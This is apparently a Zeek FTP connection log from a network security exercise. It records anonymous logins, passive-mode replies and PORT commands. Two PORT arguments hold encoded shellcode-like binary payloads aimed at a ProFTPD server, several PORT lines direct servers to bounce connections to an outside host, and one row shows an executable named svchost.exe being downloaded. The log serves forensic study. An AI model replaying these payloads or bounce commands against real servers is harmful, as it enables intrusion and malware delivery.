ts,uid,id.orig_h,id.orig_p,id.resp_h,id.resp_p,user,password,command,arg,mime_type,file_size,reply_code,reply_msg,passive,orig_h,resp_h,resp_p,fuid
1331903558.160000,CNFo204HUpVHDn1qt2,192.168.203.45,34433,192.168.21.101,21,anonymous,IEUser@,PASV,,,,227,"Entering Passive Mode (192,168,21,101,219,204).",T,192.168.203.45,192.168.21.101,56268,
1331903560.090000,CyHkLo2YfhjddpbSVl,192.168.203.45,56158,192.168.21.103,21,anonymous,IEUser@,PASV,,,,227,"Entering Passive Mode (192,168,21,103,192,28)",T,192.168.203.45,192.168.21.103,49180,
1331903558.950000,CotBpLi55vt2fNqm7,192.168.202.96,40138,192.168.28.101,21,<unknown>,,PORT,"\x1d\x93!\xf8t\x1ck\xd64\x05\xbb\xbeyu$\x152\xd5r?w-|@\x99\x9f\x90g3\xfc7\x98\x83\xf9\xb3\xb7\x92sJ\x96\x0c\xb6\x01\xe1FB\xb1A\x08\xc0\xd4Oz5(\xf5\xb4qC'N\xbap\x04\xa8\x14K\x7f\x13\xfd\xbf\x8d}zpysN5\x97\xb9\xb2\x19\xe1u<\x10\xe3'\xb4\x1b\xd5\x03\xf5\x1d\xbe\x14\x9bq{G\x91\xbftHg\x9f\x93|\x02\xfd;\xf9v$rI\xb6\x88\xd40\xf8*\xe04K\xb3\x89\xeb\x18\xd6\x05w\x04x8\xe2C\xb7\x1cO\xa8\x99\xb07i\xc1\xd2\xfc,\x84\xe0-\xb1\xba\x98\xb8\x90|Ay\x15\xbb\x7ff\xb5s\x09\xe2\x0c}Jw?\x8c\xe1B\xa9p\x12\xe3\x11\xeb@rF\x96\x92\xa8z@\xb7{G\xb1H\xb4q\x04x\x15\xb0I<\xa9u\x05\xbf\x86\xfc\x90\x985\x1c\x14\x9f\xd6v,\x85\xf8\xb2\xb6\x99A\xb9f\xb3?O\x92J$\x93\xbe\x8dFB\xba\x80\xf9#\xd5\x9b-\xf5\xbb\x97gC\x1dt\x0c\x96\xb54\xb8\x1a\xfdK\xf7\xd0\xd4N'7\x91\xeb\x06@\x9f:c\xe7w\xe9\x13\xfc\xff\xb9\xb7\x90*\xf9J\x1df\x987\xb4<\xf5\xb1N\x13\xc1\xe2\x1czk\xd5\xb2\xb8\x88\xe1t\x7f}g\xb91\xf9\x1dC\x9bq\x08\xe0I\xb6\xb5i\xd2\xd4|A\x93\x97\x91\xb1\xb4\xba\x96\x0b\xf87{$?\xbe\x85\xd6(\xe1\x09\xe25z@\x81\xfcu'rJtBx\x0cy8\xe3H\x7f\x04q,v\x1a\xf5\xbb{\x1c\xe0B\xb0|#\xf9@As-f\xfcC\x90N\xb4'G\xb8\xb6\xa8\xb1},KIH\xbfw\x18\xeb\x04\x0cJ\x97\x9f\xba\x93\x99\xb2\x91\xd3\xd6\xbe\x8d?7\x96p\x05\x98\x1d\xb5\x9b\xb95\xf5\xb7\x92\xa9\x14\x80\xd4g\xb3\x15<4\xd50\xf8$OF\x86\xfd\xfc\xbb\x99\xa2Q\x87\xeb\x0c^V1\x1e\xad\x01\xc3\x85\xc0u\xf7\xc3\xe8\xef\xfff\x05u\xe5\x98Z\x91\x90g\xa3b\xc2\xeeFS\xd0\x95\x03\xc6\xe4\xdeF\xeb\x8f\xb3rx\xfd\x1bt\xc9Kz\xbb\xcazB\x17\x08\x1d>j]\xfd\x7f\xa5\x90\xfc\xb8\xd8[\xac\x11\x96\xce@\x15\xea\xd2a\xf9`j\x19|\xb6\x1f\x93\x7f\xe7\xb0\xa8\xc8\x1f\xba\xf6\xe8\x1eo\xe5\xd5i\x04\xdd\xaek\xcc,NZ0\xe2qR\xbd\xfb\xb6U^\x8e\xcc\xa5\xe3\x88\x16\xd7?\x1d\x8b\x7f\xcb\x85o\x81\x18S\xfb\x8d\xd5\x10\xa3\x91\xe8\xf5\xdf\xaea\xf8\x0f'1\xde\x8bc\xe1\x7f\x8d\xc9D\x80\xcd\xb69$\x85U-^\xc41\x82l\xf7\xc1\x8c\xe7\x84\xf3\x13S\x03\xb8\xdc}\xd4\xbf\xf69J>\xf99B\x85\xadi\xfc,\xce\xe2\xfc\xd1\x1b\xa4\xac}\xf4\x04\x1d>\xa4\xecw\xb1\x9b\x0cx\x1b\xb4\xa6\x82\xcc{\x9eGl\x14\xdcW}|i\xb1\x17l?i\x80\x15\x1a\xe11\xd9\xb1\x8frQ5o<\x920c\xa9R\x0f\xd9|l\xbat\x81\xf8@\xdf\xd6\x94J\x06\x10;\xb5m*\xf2#\xceE\xfb\xa3\xce\x95\xad\xa9\xce\xfd\x09\x89\x9c\x18V\x04\xb1\xb0\xc3\xa6\xe0eC\xce\x0eS\xa3Q\xf0\xb65\xae'\xc6M\x13x&\xae\xeb\x7f\xb6{I\xb0\x86\xf8vux\x09\xe0zy0\xd5\x91\xa8\xb7\xb5\xb4\x9f\x7fJ\xb6\x87\xd1\xe1\x14<\x13\xd0\xd4\x1c\xb71\xe35\xb1p\x01\xf8\x05\x9b\x92\xb3\xbb\x8c\xe2F\x93B\x974\x1b\xf5\x8dwf!\xc6\xc1\xd6I\xa8\xba{\x15\xb2r'\xbf\x83\xfcC,\x1dO\x99G\x98)\xebN\x89\xd5\xb9(\xfd\x90}-7\xb8@\x04gs$|q?\xb0\x0c\xbe\x96\x91AHtK\x84\xf7\xe0w\x0b\xf9\xa9\xb7\x14\x03\xf6\xe1{O\x8dA\xb3\x80\xe2?\x81\xfc5\xbaf\x85\xd4\xbe$#\xf8ypz\x10\xeb\x7fC\xa9\x9fJxr'\x93\xb5\x18\xf5\x91\xb87B\x15\xb9}FqtH\xb4\x0c@<\x99\xbf\xa8K\x08\xd3\xe30\xfdui\xd5N\xb13\xd6I\xb6g\xbb\x1cv\x1d\x9b\x97\x96\x04\x90|-\xb24\x92\x989\xf9,G\x05\xb0su8\xfc\x86\xd4J\xb5\xbb\xbe\x96\x97\x1d\x98'@\xa8}y\x11\xe1,A\xb7s\x1c\xb8wz$5v{\x19\xd2\xe3\x15\x99\x8d\x02\xf8\xb2\x12\xf5\xb3\x9b2\xe0KI;\xebgCrk\xd5\x1a\xfd7\xb1tH\xb6?\xba\xa9\x88\xf9\x924\x90\xb0F\xb9\x9fO\x7fk\xd6-\xbf\x0c\xb4\x14B\x91qp*\xe2x|\x05\x93f\x04<|N\x8d\x7fG\xa8\xb1\xb4\xb0r\x13\xfe\xc7\xc1\xd0\xe0x\x04sOJC8\xfd5\xb8u\x0b\xfc9\xf9\xb5\x97{\x09\xe3B\xbft\x1c\x03\xf5'}\x1a\xd1\xf8\xba\x83\xf7\xeb-G\x93\x05\xb9pN\xb3\x96\x98v\x1dIf?\xb6$\x92\x0c,\xb7\x8c\xe2HzyqK\x84\xd4\x01\xe1A\xb2\x90\xa9#\xd54\x87\xd3\xd6\x99\x9b@\x91\xbb\x14F\x9f<w\x15gy|7\xbe\x99\xb7\x97\x961\xfd\xb8\xb5\xb4i\xfc\x91\x86\xe1\x04f$-\x11\xd2\xd6O\xbbFs\x1cr<\x93\x145H\xb3\xb1\xbf\x81\xeb\x05\x98\x9f\x12\xe0gJ\x7fqG,'7)\xf6\xd4\xb9\x92\xa8vw\x18\xd5\xba\x90\xbe3\xf8\xa9\x80\xe3N\xb2?\x9b\x0cA\xb00\xf5\x15\xb6\x1d{uz}C4\x08\xf9pxKI\x8dB\x10\xe2ts@\xb6uH\x98\x1b\xd5?\xb0\x14\x99\x89\xf9(\xd4\x8dw4\x92\xa9C\x88\xe3B\xb7\xbaqy@\x91\xb3FJO,\xb8v\x1dA'\xb5\x85\xfd\x96\xb2\xbe\xa8tN\x15\x05\xb9\x1c}<\x90!\xe1{\x7ff;\xe2|\x0c5\x9fpg2\xfc*\xebz7\x9b\x87\xd6\x97\xb4\x02\xf5\x93rx-I\xbbKG\x04\xb1\x19\xe0$9\xe3r|tuw{si\xf8\xbf\x962\xd6Az\x12\xf8\x81\xe0\x1b\xd5\x90\xb9\xa8g\x86\xf9I\xb7\x8c\xe2\x04\xa9\x93\x97\xbb\x15xF7\x8d\x7ff\x92;\xfc\xb8\xb4@\x88\xe1q\x1c4\xb3\x98$G'K\x99\xb2\x9f\x9by\x14CN\x0c\xb0\xb1\x1d\x1a\xf5?\x915\xba\x18\xebJ\x13\xd4pv\x05B\xb6\x19\xd0\xfd\xbf-\xbeO\xb5},<8\xebH\xb1v-5'\xbfxq\x7fz}spN\x8d\xb8@\xb5\x9b7\xb3!\xf7\xe3t\x11\xe1\x04g\x90\x98\x9f4\xbbJ,A\x10\xd4G\x89\xf9\xb43\xfcBF\xb0\x84\xe0*\xd5\x1dy$Hwf\x01\xd6I\xa8\xb9\xba#\xfd\x0c\xa9?{C\x99\xbe\x92\x91\x15(\xf5\xb6\x14\xb7\x1c\xb2rK)\xf8\x93Ou|\x08\xe2<\x97\x96\x05rwA\x92u\x1d\x85\xe3\x0b\xd2\xfe\xc7\xc6\xc1\xf8\x91x\x09\xe0\x03\xd1\xe20\xd4\xbeg\x15\x90\xb8\xb2\xb1\x1c\x7f'\xb3}F\x80\xf5\x04\xa9\xbb1\xd3\xe1<k\xf6\xeb4\xb7\xb9H\xbfB\x05\xb5tyJ7\x965zv$\x87\xf9\x99|pqf?CO\xb4)\xf6\xd5{G\x9b\xbaN\x8dK\xa8\xb0\x14I\x9f\x97\x98@\x8c\xc0\xfds\x0c,1\xd6\x93\x83\xfc-\xb6{w-\xba\x9fx\x02\xf5|yG<\x91\x08\xe05\xb4B\x99v,\x1c\xa8\xb0\xb8\x09\xf8J3\xf9\x1d@\xa99\xd5\xb57\x05\xb2\x04\x97\x98\x15A\x93\xbb\x0c\x10\xd4\x9b\x7fN\x14uK\x80\xc6\xc0\xe3\x03\xd1\xe2\x19\xe1C4z\x12\xd2\xebO\xbetg\xbfH\x8d\x90\xb9p\x1a\xfdf\x92\x86\xfc\xb3$k\xf7\xd0\xd6\xb6q'I?\x96\xb7rF\xb1s}!\xd3\xe1N\x7fxI\xb4\xb2ps@\x9b\x0c\xbe}{\x18\xe0t0\xfd\x90\x88\xebvG(\xe32\xfe\xc1\xd6\x05uK|*\xf8yHF\x98\xbb\xb6A\x9f\xbf\xba\x1b\xd4,i\xd5?\x1c\x91\xb5\x96\xa8\x13\xf94\xb7C\x84\xf5z'<rB\x92f\xb3J$\xb1\xa9\x93\x97\x1d\x0b\xfc\xb8\x145g\xb0O\x15-\x99\x02\xe2wq\x04\x81\xeby\x01\xe17\x8d\xb9\xb2\xba\x97vr\x0c\x14\xb8\x98@#\xd4\xa8F\xb7\xb5sN\xbb\x11\xe3$\x90\x89\xe0,}zq\x05\x04\xb0O\x9f\x93\xb6\x7fg\x15\x1c|u8\xfcI;\xe2-\xb9\xb3\x91J\x85\xf9\x83\xfd\x92{'5K\x02\xf5x*\xd57\x9641\xd1\xf8\xbe?\x1d\x8dCp8\xd6B\xbfA<\xb1\xb4\x9b\x99wtH#\xc1\xd3\xe1f\xa9\x83\xe0\x09\xe3\x11\xe2y|G\xb7\x88\xfd\x7ff\x1d\xb6\x9f\xa8z@\x91H\xbfu4\x99I\x92\x8d\xb5'\x97Bq-\xa9sG\xb0\xb2\xb1t\x10\xf9<vK\x1c(\xf8\xba\x96\x9b\x14\xbb!\xc0\xebC\x86\xd4\xbe\x15g\x90N\x87\xf6\xd5\xb9rA\x0c{;\xf5}5\x81\xd0\xd6J\x93i\xfcOp\x05\x98,\xb3F\x04\xb8$w?x7\xb4yq\x0c\xb1wr'\x15\xb0\x1c\x8c\xe0O\xb2\xb6\x8dKvu3\xf8\x84\xe2@\x91\xbb2\xe1}sf\x9fxt,C$\xba)\xf9\x89\xe3\x1dA{\x7f\x0b\xd6g\x93\x01\xeb|\x03\xd4\x04<\x12\xd5zG9\xf5N\x98p\x13\xfd5\x85\xfct\x19\xebsI\x97\x96\xbex\x14w?\xb9}0\xf7\xe3H\x90\x7fJ\x9b\xbf\xb8uF\xb7\xb5\xa9\x99|-p\x08\xe2\x05\x92v4\xa8q7\xb3\xb4{\x1a\xe1BrC\x80\xf5\xa9k\xd6\x974F\x92y\x15\xb4\xb8\x91\xb05KI\x98\x9f?\xd5\xb6\x18\xe0\x1c\xbbH'\xb5\x1d\xfc$\xb7O\xb2-JA,@\x96B\xb9z\x05\xbe\x04\x99\xb3G\x8d\x90\xba\xb1\xa8\x0cNg\x1b\xf9\x9b\xd2\xfd\xbf\xd47<f\xf8\x14\x93",,,220,ProFTPD 1.3.4rc2 Server (Debian) [::ffff:172.16.8.101],,,,,
1331903561.260000,CptK3340W66OKHK3Rd,192.168.202.96,43740,192.168.28.103,21,<unknown>,,PORT,"\xbe\xb9wN\x11\xd1\xe1yH\xb8fI\x86\xfdvG\x80\xd5K\x9f\xba\xb4\xb1\x96x'B5{\x7f#\xf5\xa8tC\x15\xbbr\x02\xf8\x93\xb0\x98g4\xb5\xa9\xb7\x97\x14\x04\x92\xb2\x0c<\xb6\x1c}J$s-p\x05z|\x1d?z{u7\x8d\x90\x9btq<\xbe\x03\xd2\xe3\x19\xe0A|wx\x1cJ'\x97$y}f\x01\xe1\x04r\x1a\xd4\xb9\x81\xf9\x96\x0c\x93G\x9fB\xb7\x98\x85\xfc\xb2\x83\xeb\x7fp\x05\xbb\x15\xb1?\x99\x91(\xfd4N2\xe2C\x88\xd6\x13\xf5g\x90\xa8s7@I\x8d\xb5vq\x14\xb3\xa9\xbft5\x7fKu-\x92y8\xe1Ox\x12\xe3!\xf8pF\xb4\xba\xb0r,\xb8s3\xd5vHz\x1d\xb6\x90\xa9\x89\xd3\xe0$\xbf}@g\xb8\x10\xd5\x98\x8c\xe2\x15\xb3F\xd6|,\xb2{\x04O\xb0\x91\xb1B;\xc0\xeb*\xfcf\xf5\x97\x9b7\x92\x96\x1b\xf9\xbb\x14CJw\x0c\xb4N\xb6H\x1dK\xb9\x8d\xba\xa8\x99\xbe-\xc1\xf8<\x9f\x18\xd45\x93GI4\xb7?\x05A\xb5\x1c\xfd'\xeb\x06\xb2\xfd:c\xe7w\xe9\x13\xfc\xff\xb0\xfd\xb9\x99N\xb2\x15\x1d\xbe\xf8GKF\x93\x92\xbbHxB\xb5\x14f7$Fs\x04\x9f*\xf5r\x15\x80\xe3\x01\xebv!\xf9?\xb75\xb1\x81\xe1\x0c\x83\xfdz\x11\xd2\xd4x\x13\xd5\x96\xb0\xbepNt\x05\x8d\xb6\x93\xbf\xb4|I\x90\x88\xe2\x08\xfc\x9b\xbaq<s@r'\x7f\x09\xd3\xe3\x1cv\x1d\x86\xe0C\x92\x99\xb7\x90y1\xd6\x9b}$\x99'{0\xeb7f\x97\xfd\xf8\xb9-\xb4<5\xb6\xb1\x92\xb3\x18\xf9G;\xfc,\xba\x14w\x1d@u\x15\x98B\x84\xf5F\xbeC\x9f\x1c\xa8g?K4\x91\xbbN\xb8\xa9\x05\xb2\x96O\xb5\xd5\xd4\x8d\xbf\xb0\x93I\x0cA\x04HJ\xfc\xbb\xd1\xaa1u\xeb\x0c^V1\x1e\xad\x01\xc3\x85\xc0u\xf7\xc3\xe8\xef\xffne\x87\xad\x90z\x8f\xd8o\x83P\xba\xe6fa\xe8\x9d\xe3\xd0<\xd5\xa6\xd8\xb7\xbbRj\xb5\x13T\xdbsB[\xdc\xb2J7\x1e\xd56Js5\x06\x85\x864O\xf8id\x18v\xdb\x98-\xca\xe0\x99\xe1@X\xe1\x84\x97-[\x86\xc7\x9e\xd0\xc0\xbe\xf0\xfez\xdd\xcdI\xf6\x15\xa5K\xdedFz\x1e*y\xb2\x933\xbduLF\xb5\x85\xf1P\x0e\xf7-\xd5\x93_\xa5Mpaj\x0b\xf3m\xc7X[r\xd6\x8d\xd7\x8eS08\x07'\x16\x9cC\xf37\x85)RH\xd5\x96\x0b\xec\x9d5_\x96\xac\xa4\xba\xbf\x8c\x93ek\x1b\x98\xee\xb5\xdc\xdf\xc4\x01r\x1e\xe7qZ\xe5\xb3!\xf4\xcc\xbb\xaa\x04\xf0i|U^\xc2<\x05\x1e\xb2\xd4O\x91\xed\xc4o{\x86n\x95\xeci\xc6_\x8c\x01\x14`\x03\xa9\x91\x86\xf1]\xf7\x11n\xc7R\xe9\x0f\x08I\x97\x10\x82}g\xdec\x08{\xb7\x83G!\x1e\x9brL\x9f\x09x\xc7\xc8\xa5\x82>>j}\x154\xa3\xeb\xd6#\xcc\xfb\xd6\xb3\x9a\x91\xd6\xdbz\xc1\x84\xfe\x84\xdc\xb8R\x11\xde\xe8\x07\xb2\xb6\x16q\xf4\x19\xe8T\x04f?\x91\x82\x9e5\xf1N^\xb6\x09Q(\xd5\x93'$zu!\xd1\xf8\x99\x7f\x01\xebpvB\xba\x93\xb5<1\xe0}AK\x9f\x99#\xd4\x98\xb8\x83\xf6\xd5\xb9rxO\x7f\x04\xb2w7\xb35{-\x87\xf7\xe1i\xfc\x92\xa8|F\x90\xb4\x1cI@uJN\xbf\x14\x96)\xfe\xc0\xe2\x03\xf5\x11\xf8\x91\x1dH\x1b\xfdzq?gsk\xd6G$tC\x15\x8d\xb1\xbef\x9b4\x0b\xf9\x10\xe3,\xa9\x97\xb6\xbb\x05\xb7\xb0'yutp\x1a\xe0\x09\xe2\x0c\xb2\x9fqK\x98}vA\xb0w\x7fyB\x86\xeb\x14\x93'\x19\xe1?*\xfd\xb8\xb74\x99\x0c\x97\xa8\xb1gIF\x15\x91@\xb5Ox5rN\xb4z\x1c3\xf8J|,Cs;\xd2\xfc{(\xf5\x90\x929\xd52\xd6\x05\x8d\xbe\x1d\xba\x9b<\xb37G\xb9H\xb6\x96\x04\x08\xe3-\xbbf\x02\xd4\x88\xf9\xbfy|$\xa9\x8c\xe1u@Gr4\x80\xe3O5\xb0Ix\x15\xbe\x9b\xb3\x85\xebw\x05\x8d\xb9\x81\xd0\xd58\xd4\xb6\x96\x91g\x12\xf8A#\xfd$\x84\xf5-\x93tF\x92f\xb4\xb2\x13\xc1\xe0pC\x18\xf90\xfcq{B\x98\x9f\xba}z'\x7fsK\x99<\x1c\x0c\xb7\xb1\xa9\xb5\xa8N\xbb\x14H\xbf\x90?\x1d7\x89\xe2v\x04\xb8)\xd6\x97Jzv,\xb9\x97pwFG\x0b\xf59\xd3\xe3|*\xebJy,\x89\xe1\x03\xd5\x04\x09\xf6\xd4g\xb2\xbe{}\x15-\x90\x14\x1d\x98\xb5B\x12\xf7\xe0!\xf8\x05\x1c\x08\xf95\x93\x9f\x91\x9b\xb8\x13\xfd\x8d\x7ff\x92?\xbb\x961\xd2\xd0\xfc\xb7\xb3\xa9\xb47xs<\x8c\xe2r\x19\xd6\xba@C4I$'\xa8\x99\xb1Out\x0c\xb0A\xb6H\xbfKqN}wp\x155\x90tz{x,\xbe\x97\xb4\x9f|\x14r?sNq\x1c\x8duF\xb3\x1a\xe1@\xb6\x80\xfd\xbb\xb8\x86\xfe\xc1\xf84\x10\xe0\x05\xa9\x04C\xba\xbf\x93B\x9b\x99\xb0K;\xf9g\x87\xd63\xfcO\xb1\x0c\xb9\x91\xb7<\xb5\x92J(\xeby$\x85\xf5k\xd4\x01\xe3A-H\x1dfi\xd5\xa8G\xb2\x7f2\xe27Ivyr\x02\xebx{'\x98\x96\x92\xbf\x88\xe2-qvApK#\xc7\xc0\xd6\x93I\x14\x1c\xbb\xb1\x81\xf98\xe1\x11\xd1\xe0<\x9fB\xa9\x7fG\x990\xf8wz\x05\xa8\x8dF\xb8H\xb2'74\x9b\x15|u\x04\x83\xe3s\x18\xfc\xb9\x90\xb5\x1d\x1b\xd5f?\xba\x0c\xb4\x84\xfd5\x96\xb3C$\x98\xb0\x91\x97\xbe\x13\xd4N\xb7\x0b\xf5\xb6,}OJtg@w{xHy\x11\xf7\xe0s\x01\xd6\xb8v\x1a\xebK\xb1\xb2p\x05u'zI\xa8t$\x87\xf9\xa9\x90\xb5\x91\x7fg\x9f\xb6\x88\xf5,\x8c\xe1\x0c\x8d9\xf8-\xb3\x14\x97*\xfc\x96qG}|\x1cr?4\x1d\x89\xe3\x15\x98\x9b\xbaO2\xf6\xe27\x18\xfe\xc0\xd5k\xfd\xb7CJN\x04A\x99f\x92Fi\xd4\xbe\xb9<\xbf\xbb\xb4\xb05\x93@B|yI\x8dJ\x9b,\x85\xd1\xe1\x7fx\x0czs\x12\xe0\x19\xd6\x1b\xd4!\xe3q\x04(\xf5\x93\x83\xebr@'\x92\x1c\xbf<5\x15\xb6C7\xb3{\x10\xd0\xfc\x80\xfd\x97\x84\xe2tA}F\xb4?O\x9fB$\xb8\x05\xb2\x81\xc7\xc7\xc1\xd3\xf91\xf8\xa9\x99\x98G-\xba\xb08\xd5w\x1d\xbb\xb5\x904\xa8uKH\x96\x91\xbe\xb1pg\xb9vN\x14\xb7f\x96|)\xe0\x02\xebxvr}sIG\x86\xe2w4\xb1\xb4f\x92\x8dz\x08\xd5\xb90\xfd,\xbfp\x03\xf5<\xba\x09\xd6\x9f\xb3\xb2\x90K\x97\x14\xb6AuFB\x99O\xb8y#\xfc\xa8;\xd2\xf8@\x04\x93\x983\xd4\x7fN\xb0\x91\x05qC\xbb\xb7t-*\xe3\x15\x1c\xa9\x9b'\x87\xd1\xe1\x0cg\xb5\xbeHJ57?{$i\xf9\x1d\x90yN\x1d\x89\xe0r<v$k\xf9\xbb\xb27\x19\xeb\x11\xe2s\x7fK\x935\x991\xfe\xc0\xe3G\x98\x85\xd5g\xb9\xbe\x8dF}f\xb7\x9f\xb6u{I\xa9\x96\x9b\x04\xb0'\x13\xfd\x15\x09\xd3\xd6\x91\x0c\x92\x1cO)\xe1H\xb5p\x0b\xd2\xd4\x1b\xf5C\x05\xba\x14\xb8tzxA|q,\xa8wJ\x97\xb14-\xbfB\xb4\x86\xfc\x84\xf8?@\xb3uwB\x18\xfc\x8d\x10\xc1\xe2\x1c\x05r\x04t8\xf9\xbe,\x96|N\xa8\xb5\xbf\x9f\x99\x03\xf8y-#\xfd4\x12\xebxI\x90\x97q}s{?\x8c\xe1J\x15CO@\xb0H\x88\xe0\x0c\x14$5\xb1\xb30\xd4(\xf7\xe3'\xb9\x98F\x7f<\x9bK\xbb\xb2\xb4\x93\xbafG\x92A\xa9g7\x01\xf6\xd6\xb7\xb6\x91\xb8v9\xd5pz;\xf5\x1dq}Gzv\x1a\xeb3\xd0\xe3-\x97s\x04\x93f\xa9\x98\x15r\x7fO\xa8\xb2\x9fx\x1ct,\x91\xb9\x9bu\x05$\x83\xe1\x02\xd4?w|7\x99\xbe!\xf9{4K\xb6\xba@\xbbA\xb4\x90\x8c\xe0B'\x81\xf8\x14\x1dyH\x96\xb1\x8dCJ\x80\xfdp<\x08\xfc2\xf5\xb3I\xb0\x0c\x92Fg\x0b\xd6\xb7\xb5#\xd5\xbfk\xd3\xe2z5\xb8\x81\xebN\x87\xf6\xe0t)\xd0\xd4\x93p}\x18\xf5fIAv|y\x7fs?u<\x15,4\xb2\x85\xd5\xb5g\x0c\x02\xfc\xb41\xe2w'\x90\x9f\xbb\x86\xf7\xe3O$r\x05\xb0\xbf\x8d\xb7C\x91\xb3\x9b\x1c\x92\xb6qF\xbeJG\x04\x96\x99\xa9(\xe1N5K\xb1\x98\x97\x1b\xf8-\xb9\x1d@B\xa8\x13\xd6x7*\xf9\x14H\xba{z9\xfd\xb8\x8d\xba0\xe0vqxtN\x9f\xb6\xa9\x98FB8\xd5-r\x14\x90\x1d\x89\xd2\xe12\xfd\xb8|A\x05\x03\xc1\xe2O@?y\x1a\xd1\xe3\x0c\xb7\x01\xeb7f\xa8\xb3pu\x044sg\x93\x9bIw3\xd6\xb4\x91C\xb9\x96}{H\xb1\x7fy\x10\xe3\x12\xd4\xbfv\x15x5q\x09\xf8|<\xb5\xb2r!\xe2K\x97\xbbw$\x92\x7f;\xeb\x1c\xbesJ\x84\xe1G}\x19\xf9\x88\xc0\xe0'\xb0\x83\xfcp,\x99t\x08\xf5\xb8{B\x96Hg\xb7\xb9\xb1C\xd6FN\x05\xb4\x11\xf8\xb2@\x91\x15I\xb04\xbb,\xfc?f\xb6u\x1c5\xb5\x92\x8d\xbf\xd4\xa9'\xf9\x99O<\x98\xbeK7\x9f\xba\x9b\x90\x14GA\x0c-\x97\xb3\x80\xd5\x93i\xfdz\x04\x1d$\xa8J\xf5",,,530,Please log in with USER and PASS first.,,,,,
1331904301.560000,C3NlQu4G9w4W3TGSj7,192.168.204.45,50584,192.168.21.101,21,anonymous,IEUser@,PASV,,,,227,"Entering Passive Mode (192,168,21,101,163,245).",T,192.168.204.45,192.168.21.101,41973,
1331904300.980000,CPkf4h2tb9rnBOZg1g,192.168.204.45,50558,192.168.21.101,21,anonymous,IEUser@,PORT,"205,217,153,62,80,80",,,230,"Anonymous access granted, restrictions apply",F,192.168.21.101,205.217.153.62,20560,
1331903553.530000,CS6eR9EbTTzmY2Td2,192.168.203.45,34288,192.168.21.101,21,anonymous,IEUser@,PORT,"205,217,153,62,80,80",,,230,"Anonymous access granted, restrictions apply",F,192.168.21.101,205.217.153.62,20560,
1331903558.110000,COfF931wtdc3crwOr3,192.168.203.45,56117,192.168.21.103,21,anonymous,IEUser@,PORT,"205,217,153,62,80,80",,,230,Logged on,F,192.168.21.103,205.217.153.62,20560,
1331905066.670000,CX2CaPOLTnneF2vB3,192.168.24.100,1053,192.168.202.92,21,ftp,password,PORT,"192,168,24,100,4,30",,,200,PORT command successful.,F,192.168.202.92,192.168.24.100,1054,
1331905066.670000,CX2CaPOLTnneF2vB3,192.168.24.100,1053,192.168.202.92,21,ftp,password,RETR,ftp://192.168.202.92/./svchost.exe,application/x-dosexec,6656,226,Transfer complete.,,,,,FyhsRF3Pe3mNtgF8kh
